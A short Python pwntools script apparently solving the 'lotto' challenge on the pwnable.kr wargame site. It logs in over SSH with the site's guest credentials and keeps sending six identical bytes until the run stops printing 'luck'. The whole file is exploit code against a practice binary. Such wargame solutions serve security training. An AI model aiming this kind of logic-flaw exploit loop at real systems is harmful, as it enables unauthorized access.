from pwn import *

# lotto
host = 'pwnable.kr'
user = 'lotto'
password = 'guest'
port = 2222

# Notes
#   * Send six equal bytes to win w/ probability 14%

def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  p = s.process('./lotto')
  print p.recv()
  while True:
    p.sendline('1')
    print p.recv()
    p.sendline('######')
    x = p.recv()
    print(x)
    if 'luck' not in x:
      break

if __name__ == '__main__':
  attack()
